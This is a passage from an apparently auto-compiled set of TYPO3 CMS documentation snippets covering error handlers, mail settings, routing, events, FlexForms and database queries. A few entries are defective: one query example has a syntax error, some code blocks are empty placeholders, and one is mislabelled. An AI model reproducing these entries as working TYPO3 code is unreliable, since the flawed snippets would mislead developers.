TYPO3\\CMS\\Core\\Http\\HtmlResponse;\n\nclass MyErrorHandler implements PageErrorHandlerInterface\n{\n    protected int $statusCode;\n    protected array $configuration;\n\n    public function __construct(int $statusCode, array $configuration)\n    {\n        $this->statusCode = $statusCode;\n        $this->configuration = $configuration;\n    }\n\n    public function handlePageError(\n        ServerRequestInterface $request,\n        string $message,\n        array $reasons = []\n    ): ResponseInterface {\n        $html = '<html><body>';\n        $html .= '<h1>Page not found</h1>';\n        $html .= '<p>' . htmlspecialchars($message) . '</p>';\n        $html .= '</body></html>';\n\n        return new HtmlResponse($html, $this->statusCode);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Class Instances with GeneralUtility\nDESCRIPTION: Example demonstrating how to create instances of classes using GeneralUtility::makeInstance() with proper namespace imports.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Namespaces/Index.rst#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\nuse TYPO3\\CMS\\Frontend\\ContentObject\\ContentObjectRenderer;\n\n$contentObject = GeneralUtility::makeInstance(ContentObjectRenderer::class);\n```\n\n----------------------------------------\n\nTITLE: Configuring Memory-Based Email Spooling in TYPO3\nDESCRIPTION: Setting up in-memory email spooling in TYPO3, which delays sending emails until the end of the request execution to improve performance.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Mail/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport_spool_type'] = 'memory';\n```\n\n----------------------------------------\n\nTITLE: Setting Email Return Path in TYPO3\nDESCRIPTION: Handles the configuration of email return path using TYPO3's MailUtility. Gets system email address and sets it as return path if valid, otherwise defaults to no-reply@example.org.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Mail/Index.rst#2025-04-16_snippet_18\n\nLANGUAGE: php\nCODE:\n```\n$returnPath = MailUtility::getSystemFromAddress();\nif ($returnPath != \"no-reply@example.org\") {\n    $mail->setReturnPath($returnPath);\n}\n$mail->send();\n```\n\n----------------------------------------\n\nTITLE: Configuring Default Password Policy in TYPO3\nDESCRIPTION: Configuration to set which password policy identifier is used for backend and frontend contexts. By default, TYPO3 uses the 'default' policy.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/PasswordPolicies/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['BE']['passwordPolicy'] = 'default';\n$GLOBALS['TYPO3_CONF_VARS']['FE']['passwordPolicy'] = 'default';\n```\n\n----------------------------------------\n\nTITLE: Using Named Arguments in PHPUnit Data Provider for Readability\nDESCRIPTION: This snippet demonstrates the use of named arguments in a PHPUnit data provider, improving the clarity of test data configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/PhpArchitecture/NamedArguments.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\nfinal class XliffParserTest extends UnitTestCase\n{\n    public static function canParseXliffDataProvider(): \\Generator\n    {\n        yield 'Can handle default' => [\n            'languageKey' => 'default',\n            'expectedLabels' => [\n                'label1' => 'This is label #1',\n                'label2' => 'This is label #2',\n                'label3' => 'This is label #3',\n            ],\n        ];\n        yield 'Can handle translation' => [\n            'languageKey' => 'fr',\n            'expectedLabels' => [\n                'label1' => 'Ceci est le libellé no. 1',\n                'label2' => 'Ceci est le libellé no. 2',\n                'label3' => 'Ceci est le libellé no. 3',\n            ],\n        ];\n    }\n\n    #[DataProvider('canParseXliffDataProvider')]\n    #[Test]\n    public function canParseXliff(string $languageKey, array $expectedLabels): void\n    {\n        // Test implementation\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Custom YAML Site Configuration Example\nDESCRIPTION: Example of extending TYPO3 site configuration with custom project-specific options in the YAML configuration file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/ExtendingSiteConfig.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nmyProject:\n  recordStorage: 123\n  apiKey: 'jk23h4jk23h4k2j34'\n```\n\n----------------------------------------\n\nTITLE: Extracting TYPO3 Source Package on Linux\nDESCRIPTION: Command to extract the downloaded TYPO3 source package tar.gz file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/LegacyInstallation.rst#2025-04-16_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ntar xzf typo3_src-13.4.y.tar.gz\n```\n\n----------------------------------------\n\nTITLE: Displaying Help for TYPO3 Cache Flush Command (Composer-based)\nDESCRIPTION: Demonstrates how to show help information for the cache:flush command in a Composer-based TYPO3 installation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CommandControllers/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nvendor/bin/typo3 cache:flush -h\n```\n\n----------------------------------------\n\nTITLE: Validating Blog Post Title in TYPO3\nDESCRIPTION: Implements a custom validator for blog post titles that prevents titles starting with an underscore. Uses AbstractValidator as a base class and provides custom validation logic.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Validation/CustomValidator/_PropertyValidator.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nfinal class TitleValidator extends AbstractValidator\n{\n    protected function isValid(mixed $value): void\n    {\n        // $value is the title string\n        if (is_scalar($value) && str_starts_with((string)$value, '_')) {\n            $errorString = 'The title may not start with an underscore. ';\n            $this->addError($errorString, 1297418976);\n        }\n    }\n```\n\n----------------------------------------\n\nTITLE: JavaScript Callbacks for User Settings Module - PHP\nDESCRIPTION: This PHP snippet is used to extend the TYPO3 User Settings module with JavaScript callbacks, utilizing parameters such as clickData or confirmData. This example belongs in the ext_tables_settings.php file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/UserSettingsConfiguration/Extending.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n..  literalinclude:: _ext_tables_settings.php\n    :language: php\n    :caption: EXT:examples/ext_tables.php\n```\n\n----------------------------------------\n\nTITLE: Using FlexFormProcessor in TypoScript\nDESCRIPTION: Shows how to use the FlexFormProcessor to make all FlexForm fields available in a Fluid template as a single variable.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlexForms/Index.rst#2025-04-16_snippet_14\n\nLANGUAGE: typoscript\nCODE:\n```\nmy_content = FLUIDTEMPLATE\nmy_content {\n  dataProcessing {\n    10 = TYPO3\\CMS\\Frontend\\DataProcessing\\FlexFormProcessor\n    10.fieldName = my_flexform_field\n    10.as = myOutputVariable\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Enum Settings in YAML\nDESCRIPTION: Example showing how to define site settings with enum values for selectable options in the editor GUI.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/SiteSettingDefinitions.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nsettings:\n  foo:\n    type: enum\n    label: 'Foo'\n    enum:\n      - 'foo'\n      - 'bar'\n      - 'baz'\n    default: 'foo'\n```\n\n----------------------------------------\n\nTITLE: Including RST Document Header for Extbase Documentation\nDESCRIPTION: RST (reStructuredText) directives for setting up the documentation page for Extbase extension development in TYPO3, including navigation title, index references, and embedding a YouTube video.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Extbase.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n:navigation-title: Extbase\n.. include:: /Includes.rst.txt\n\n.. index:: Extbase; Tutorials\n.. _extbase_tutorials:\n\n===================================\nExtension development with Extbase\n===================================\n\nExtension Development with Extbase @ TYPO3 Developer Days 2019\n\n.. youtube:: Di6Ggjjjivw\n```\n\n----------------------------------------\n\nTITLE: Using LanguageService in TYPO3 Controller\nDESCRIPTION: Example controller demonstrating how to properly use the LanguageService in TYPO3 CMS. It shows how to access the LanguageService via the LanguageServiceFactory for string translation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/LocalizationApi/LanguageService.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Controller;\n\nuse MyVendor\\MyExtension\\Exception\\CustomException;\nuse TYPO3\\CMS\\Core\\Localization\\LanguageServiceFactory;\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface;\n\nfinal class ExampleController\n{\n    public function __construct(\n        protected readonly LanguageServiceFactory $languageServiceFactory,\n    ) {\n    }\n\n    /**\n     * @param ServerRequestInterface $request\n     * @return ResponseInterface\n     */\n    public function myAction(ServerRequestInterface $request): ResponseInterface\n    {\n        try {\n            // ...\n        } catch (CustomException $e) {\n            $languageService = $this->languageServiceFactory->createFromUserPreferences($GLOBALS['BE_USER'] ?? null);\n\n            // Always hand over the original exception message\n            // as a reference to the localization string\n            $message = $languageService->sL('LLL:EXT:my_extension/Resources/Private/Language/locallang.xlf:' . $e->getMessage());\n\n            // ...\n        }\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Registering Backend Module in Extbase\nDESCRIPTION: Example configuration for registering a backend module in Extbase using UpperCamelCase notation for the extension key.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Namespaces/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\nreturn [\n    'tools_MyExtension' => [\n        'parent' => 'tools',\n        'position' => ['after' => 'tools_ExtensionmanagerExtensionmanager'],\n        'access' => 'user,group',\n        'workspaces' => 'live',\n        'path' => '/module/tools/MyExtension',\n        'labels' => 'LLL:EXT:my_extension/Resources/Private/Language/locallang_mod.xlf',\n        'extensionName' => 'MyExtension',\n        'controllerActions' => [\n            \\MyVendor\\MyExtension\\Controller\\MyModuleController::class => [\n                'list', 'update', 'delete',\n            ],\n        ],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Registering Custom Context Menu Item Provider in TYPO3 YAML Configuration\nDESCRIPTION: This YAML configuration disables autoconfiguration for services and registers a custom context menu item provider. The provider is tagged with 'backend.contextmenu.itemprovider' to integrate it into the TYPO3 backend context menu system.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Tutorials/ContextMenu/ManualServicesYaml.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  _defaults:\n    autoconfigure: false\n\n  MyVendor\\MyExtension\\ContextMenu\\SomeItemProvider:\n    tags:\n      - name: backend.contextmenu.itemprovider\n```\n\n----------------------------------------\n\nTITLE: Using ModifyAllowedItemsEvent in TYPO3 Event Listener\nDESCRIPTION: This example shows how to implement an event listener for the ModifyAllowedItemsEvent in TYPO3 to modify the list of allowed link types in the backend.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/ModifyAllowedItemsEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse TYPO3\\CMS\\Backend\\Controller\\Event\\ModifyAllowedItemsEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(ModifyAllowedItemsEvent $event): void\n    {\n        // Remove 'folder' from allowed items\n        $event->denyItem('folder');\n\n        // Add a custom item to allowed items\n        $event->allowItem('myitem');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Registering Extbase Plugin in PHP\nDESCRIPTION: Shows how to register an Extbase plugin in the New Content Element wizard using ExtensionManagementUtility::registerPlugin().\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/ContentElementsWizard.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\nExtensionUtility::registerPlugin(\n    'MyExtension',\n    'Pi1',\n    'The title of the plugin',\n    'EXT:my_extension/Resources/Public/Icons/Extension.svg'\n);\n```\n\n----------------------------------------\n\nTITLE: Adding JavaScript Modules in Controller for TYPO3 CMS in PHP\nDESCRIPTION: Shows how to add JavaScript ES6 modules to a controller response in TYPO3. This approach should be used instead of directly adding resources through the PageRenderer to ensure compatibility with Ajax contexts.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FormEngine/Rendering/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace MyVendor\\MyExtension\\Backend\\Controller;\n\nuse Psr\\Http\\Message\\ResponseInterface;\nuse TYPO3\\CMS\\Backend\\Template\\ModuleTemplate;\nuse TYPO3\\CMS\\Core\\Page\\JavaScriptModuleInstruction;\n\nclass SomeController\n{\n    public function myAction(): ResponseInterface\n    {\n        $moduleTemplate = $this->moduleTemplateFactory->create($this->request);\n        \n        // Add a JavaScript ES6 module\n        $moduleTemplate->getJavaScriptRenderer()->addJavaScriptModuleInstruction(\n            JavaScriptModuleInstruction::create('@myvendor/my-extension/my-module')\n        );\n        \n        // Or with additional arguments\n        $moduleTemplate->getJavaScriptRenderer()->addJavaScriptModuleInstruction(\n            JavaScriptModuleInstruction::create('@myvendor/my-extension/my-module-with-arguments')\n                ->instance(['foo' => 'bar'])\n        );\n        \n        return $moduleTemplate->renderResponse('MyTemplate');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Removing Most Restrictions But Keeping DeletedRestriction\nDESCRIPTION: Shows how to remove all default restrictions from a query builder and then selectively add back only the DeletedRestriction. This is a common pattern in backend modules to show disabled records.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/RestrictionBuilder/Index.rst#2025-04-16_snippet_9\n\nLANGUAGE: php\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\n// use TYPO3\\CMS\\Core\\Database\\Connection;\n// use TYPO3\\CMS\\Core\\Database\\ConnectionPool;\n// use TYPO3\\CMS\\Core\\Database\\Query\\Restriction\\DeletedRestriction\n// SELECT `uid`, `bodytext` FROM `tt_content` WHERE (`pid` = 42) AND (`tt_content`.`deleted` = 0)\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('tt_content');\n// Remove all restrictions but add DeletedRestriction again\n$queryBuilder\n    ->getRestrictions()\n    ->removeAll()\n    ->add(GeneralUtility::makeInstance(DeletedRestriction::class));\n$result = $queryBuilder\n    ->select('uid', 'bodytext')\n    ->from('tt_content')\n    ->where($queryBuilder->expr()->eq(\n        'pid',\n        $queryBuilder->createNamedParameter($pid, Connection::PARAM_INT)\n    ))\n    ->executeQuery()\n    ->fetchAllAssociative(();\n```\n\n----------------------------------------\n\nTITLE: Acquiring and Using an Exclusive, Blocking Lock in TYPO3\nDESCRIPTION: Example of how to acquire and use an exclusive, blocking lock using TYPO3's LockFactory and LockingStrategyInterface.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LockingApi/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Locking\\LockingStrategyInterface;\nuse TYPO3\\CMS\\Core\\Locking\\LockFactory;\n// ...\n\n$lockFactory = GeneralUtility::makeInstance(LockFactory::class);\n\n// createLocker will return an instance of class which implements\n// LockingStrategyInterface, according to required capabilities.\n// Here, we are asking for an exclusive, blocking lock. This is the default,\n// so the second parameter could be omitted.\n$locker = $lockFactory->createLocker('someId', LockingStrategyInterface::LOCK_CAPABILITY_EXCLUSIVE);\n\n// now use the locker to lock something exclusively, this may block (wait) until lock is free, if it\n// has been used already\nif ($locker->acquire(LockingStrategyInterface::LOCK_CAPABILITY_EXCLUSIVE)) {\n    // do some work that required exclusive locking here ...\n\n    // after you did your stuff, you must release\n    $locker->release();\n}\n```\n\n----------------------------------------\n\nTITLE: Checking Custom Site Configuration Field\nDESCRIPTION: Shows how to access and evaluate a custom configuration field from the site configuration in TypoScript.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/UseSiteInConditions.rst#2025-04-16_snippet_1\n\nLANGUAGE: typoscript\nCODE:\n```\n[site(\"configuration\")[\"custom_field\"] == \"compareValue\"]\n   page.35.value = abc\n[GLOBAL]\n```\n\n----------------------------------------\n\nTITLE: Retrieving and Modifying SQL Statements in AlterTableDefinitionStatementsEvent\nDESCRIPTION: This snippet demonstrates how to use the AlterTableDefinitionStatementsEvent to retrieve and modify SQL statements. It shows methods for getting all SQL statements, adding new statements, and setting the entire array of statements.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Database/AlterTableDefinitionStatementsEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\npublic function getSqlData(): array;\npublic function addSqlData(string $sql): void;\npublic function setSqlData(array $sql): void;\n```\n\n----------------------------------------\n\nTITLE: Translation ViewHelper with Default Text\nDESCRIPTION: Example showing how to provide default text when translation is not available\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Localization/Fluid.rst#2025-04-16_snippet_2\n\nLANGUAGE: HTML\nCODE:\n```\n<f:translate\n    key=\"LLL:EXT:my_extension/Resources/Private/Language/yourFile.xlf:yourKey\"\n    default=\"No translation available.\"\n/>\n```\n\n----------------------------------------\n\nTITLE: Using SanitizeFileNameEvent in TYPO3 CMS\nDESCRIPTION: The SanitizeFileNameEvent is fired when a file is indexed in the database, allowing modification of the filename according to project-specific naming conventions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/SanitizeFileNameEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Resource\\Event\\SanitizeFileNameEvent\n```\n\n----------------------------------------\n\nTITLE: PHP Extbase Controller Action with Null Handling\nDESCRIPTION: Example controller action demonstrating how to handle null values from routing in Extbase controllers.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/AdvancedRoutingConfiguration.rst#2025-04-16_snippet_8\n\nLANGUAGE: php\nCODE:\n```\n// EXT:my_extension/Classes/Controller/MyController.php\n```\n\n----------------------------------------\n\nTITLE: Implementing Upgrade Wizard for Core-based Plugin Migration in TYPO3\nDESCRIPTION: Creates an upgrade wizard class to migrate existing Core-based plugins from list_type to CType, compatible with TYPO3 v12 and v13.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/MigrationListType.rst#2025-04-16_snippet_5\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Upgrades;\n\nuse Linawolf\\ListTypeMigration\\Upgrades\\AbstractListTypeToCTypeUpdate;\n\nclass PluginListTypeToCTypeUpdate extends AbstractListTypeToCTypeUpdate\n{\n    protected function getListTypeToCTypeMigrationDefinition(): array\n    {\n        return [\n            'my_extension_pi1' => 'my_extension_pi1',\n        ];\n    }\n\n    public function getTitle(): string\n    {\n        return 'Migrate plugins of EXT:my_extension from list_type to CType';\n    }\n\n    public function getDescription(): string\n    {\n        return 'Migrates the list_type based plugins of EXT:my_extension to new CType based plugins.';\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Blog Category Routing in TYPO3 CMS\nDESCRIPTION: This YAML configuration sets up routing for the Blog extension's category functionality.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/Examples.rst#2025-04-16_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nrouteEnhancers:\n  BlogCategory:\n    type: Extbase\n    extension: Blog\n    plugin: CategoryPosts\n    routes:\n      - routePath: '/'\n      - routePath: '/{category_slug}'\n    defaultController: 'Post::listPostsByCategory'\n    aspects:\n      category_slug:\n        type: PersistedPatternMapper\n        tableName: sys_category\n        routeFieldPattern: '^(?P<slug>.+)$'\n        routeFieldResult: '{slug}'\n```\n\n----------------------------------------\n\nTITLE: Soft Reference Parser Usage Example\nDESCRIPTION: PHP code demonstrating how to use the SoftReferenceParserFactory to get and use a soft reference parser.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SoftReferences/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\DataHandling\\SoftReference\\SoftReferenceParserFactory;\n\nclass MyController {\n    protected SoftReferenceParserFactory $softReferenceParserFactory;\n\n    public function __construct(SoftReferenceParserFactory $softReferenceParserFactory)\n    {\n        $this->softReferenceParserFactory = $softReferenceParserFactory;\n    }\n\n    public function myAction(): void\n    {\n        $parser = $this->softReferenceParserFactory->getSoftReferenceParser('myparser');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining ModifyNewContentElementWizardItemsEvent Class in TYPO3 CMS\nDESCRIPTION: This snippet defines the ModifyNewContentElementWizardItemsEvent class with various methods to interact with wizard items. It includes methods for getting, setting, adding, removing, and checking wizard items, as well as retrieving page information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyNewContentElementWizardItemsEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Backend\\Controller\\Event;\n\nclass ModifyNewContentElementWizardItemsEvent\n{\n    public function getWizardItems(): array\n    {\n        // Implementation not shown\n    }\n\n    public function setWizardItems(array $wizardItems): void\n    {\n        // Implementation not shown\n    }\n\n    public function hasWizardItem(string $identifier): bool\n    {\n        // Implementation not shown\n    }\n\n    public function getWizardItem(string $identifier): ?array\n    {\n        // Implementation not shown\n    }\n\n    public function setWizardItem(string $identifier, array $configuration, array $position = []): void\n    {\n        // Implementation not shown\n    }\n\n    public function removeWizardItem(string $identifier): bool\n    {\n        // Implementation not shown\n    }\n\n    public function getPageInfo(): array\n    {\n        // Implementation not shown\n    }\n\n    public function getColPos(): ?int\n    {\n        // Implementation not shown\n    }\n\n    public function getSysLanguage(): int\n    {\n        // Implementation not shown\n    }\n\n    public function getUidPid(): int\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Default User Configuration in TYPO3\nDESCRIPTION: This snippet demonstrates how to configure default user settings within the TYPO3 backend using the `$GLOBALS['TYPO3_CONF_VARS']['BE']['defaultUC']` array. It defines settings such as email notification preferences, title length, and RTE availability. This configuration is typically located in `config/system/additional.php` or `typo3conf/system/additional.php`.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/BE.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n\"$GLOBALS['TYPO3_CONF_VARS']['BE']['defaultUC'] = [\n    'emailMeAtLogin' => 0,\n    'titleLen' => 50,\n    'edit_RTE' => '1',\n    'edit_docModuleUpload' => '1',\n];\"\n```\n\n----------------------------------------\n\nTITLE: Discarding Record Modifications in TYPO3 Workspace\nDESCRIPTION: CSV table illustrating the database representation of discarding modifications made to a record in a TYPO3 workspace. It shows how both the placeholder and version records are marked as deleted and removed from the workspace.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Workspaces/Index.rst#2025-04-16_snippet_9\n\nLANGUAGE: csv\nCODE:\n```\nuid,pid,deleted,sorting,t3ver_wsid,t3ver_oid,t3ver_state,l10n_parent,sys_language_uid,title\n...,...,...,...,...,...,...,...,...,...,...\n27,20,1,640,0,0,1,0,0,Article #5 discarded\n28,-1,1,640,0,27,-1,0,0,Article #5 discarded\n```\n\n----------------------------------------\n\nTITLE: XLIFF Language File Example\nDESCRIPTION: Shows the structure of an XLIFF language file used for storing localized strings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Localization/Php.rst#2025-04-16_snippet_4\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\" ?>\n<xliff version=\"1.2\" xmlns=\"urn:oasis:names:tc:xliff:document:1.2\">\n    <file source-language=\"en\" datatype=\"plaintext\" original=\"messages\" product-name=\"my_extension\">\n        <header/>\n        <body>\n            <trans-unit id=\"alert.token.updated\" resname=\"alert.token.updated\">\n                <source>The Api token in %1$s has been changed to: %2$s</source>\n            </trans-unit>\n        </body>\n    </file>\n</xliff>\n```\n\n----------------------------------------\n\nTITLE: Referencing BeforeResourceStorageInitializationEvent PHP Class\nDESCRIPTION: Shows the fully qualified class name for the BeforeResourceStorageInitializationEvent used in TYPO3's resource handling system\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/BeforeResourceStorageInitializationEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Resource\\Event\\BeforeResourceStorageInitializationEvent\n```\n\n----------------------------------------\n\nTITLE: Assigning FlexForm Variables in TypoScript for Fluid\nDESCRIPTION: Demonstrates how to assign single FlexForm variables in TypoScript for use in a Fluid template using FLUIDTEMPLATE.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlexForms/Index.rst#2025-04-16_snippet_13\n\nLANGUAGE: typoscript\nCODE:\n```\nmy_content = FLUIDTEMPLATE\nmy_content {\n  variables {\n    categories = TEXT\n    categories.data = flexform: pi_flexform:categories\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Simple JavaScript Modules for TYPO3 Extension\nDESCRIPTION: A simple configuration example for mapping the Public/JavaScript folder to an import prefix in a TYPO3 extension.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/ES6/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\nreturn [\n    'dependencies' => ['core'],\n    'imports' => [\n        '@vendor/my-extension/' => 'EXT:my_extension/Resources/Public/JavaScript/',\n    ],\n];\n\n```\n\n----------------------------------------\n\nTITLE: Using AfterFileCreatedEvent in TYPO3 Core API\nDESCRIPTION: This code snippet shows the PSR-14 AfterFileCreatedEvent class, which is fired after a file is created in TYPO3. It provides access to the created file, storage, and folder objects, allowing for post-creation modifications or validations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/AfterFileCreatedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nfinal class AfterFileCreatedEvent\n{\n    private File $file;\n    private ResourceStorage $storage;\n    private Folder $folder;\n\n    public function __construct(File $file, ResourceStorage $storage, Folder $folder)\n    {\n        $this->file = $file;\n        $this->storage = $storage;\n        $this->folder = $folder;\n    }\n\n    public function getFile(): File\n    {\n        return $this->file;\n    }\n\n    public function getStorage(): ResourceStorage\n    {\n        return $this->storage;\n    }\n\n    public function getFolder(): Folder\n    {\n        return $this->folder;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Placeholder Processor in PHP\nDESCRIPTION: Shows an example implementation of a custom placeholder processor class for TYPO3's YAML loading process.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/YamlApi/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n// Content of EXT:my_extension/Classes/Configuration/Processor/Placeholder/ExamplePlaceholderProcessor.php\n// This code is not provided in the original text, so it cannot be included here.\n```\n\n----------------------------------------\n\nTITLE: Registering a Custom File Processor in TYPO3 CMS\nDESCRIPTION: This code snippet demonstrates how to register a new file processor in TYPO3 CMS. It should be added to the ext_localconf.php file. The registration includes specifying the class name and setting processing priority using 'before' and 'after' options.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FileProcessing/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: 